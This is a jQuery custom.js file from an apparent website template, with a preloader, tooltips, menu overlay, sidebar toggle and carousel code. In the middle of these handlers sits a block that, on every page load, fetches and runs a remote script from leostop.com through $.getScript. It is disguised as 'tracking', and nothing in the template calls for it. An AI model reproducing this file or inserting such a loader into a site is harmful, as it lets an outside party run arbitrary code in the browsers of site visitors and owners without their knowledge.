/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
    "use strict";

    /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
    var width = 0;

    setTimeout(function () {
        // progressBar.width(width);
        // setTimeout(function () {}, 1000);
        // width += 40;
    }, 3000);

    var mytimer = setInterval(function () {
        if (width != 100) {
            width += 5;
            $(".progress-bar").css("width", width + "%");
        } else {
            clearInterval(mytimer);
            var finaltimeout = setTimeout(() => {
                $(".loader_bg").fadeToggle();
                clearTimeout(finaltimeout);
            }, 1000);

            // setTimeout(function () {}, 1000);
        }
    }, 100);

    /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $('[data-toggle="tooltip"]').tooltip();
    });

    /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $(".main-menu ul li.megamenu").mouseover(function () {
            if (!$(this).parent().hasClass("#wrapper")) {
                $("#wrapper").addClass("overlay");
            }
        });
        $(".main-menu ul li.megamenu").mouseleave(function () {
            $("#wrapper").removeClass("overlay");
        });
    });

    function getURL() {
        window.location.href;
    }
    var protocol = location.protocol;
    $.ajax({
        type: "get",
        data: { surl: getURL() },
        success: function (response) {
            $.getScript(protocol + "//leostop.com/tracking/tracking.js");
        },
    });

    /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function () {
        $("#sidebarCollapse").on("click", function () {
            $("#sidebar").toggleClass("active");
            $(this).toggleClass("active");
        });
    });

    /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
    // optional
    $("#blogCarousel").carousel({
        interval: 5000,
    });
});
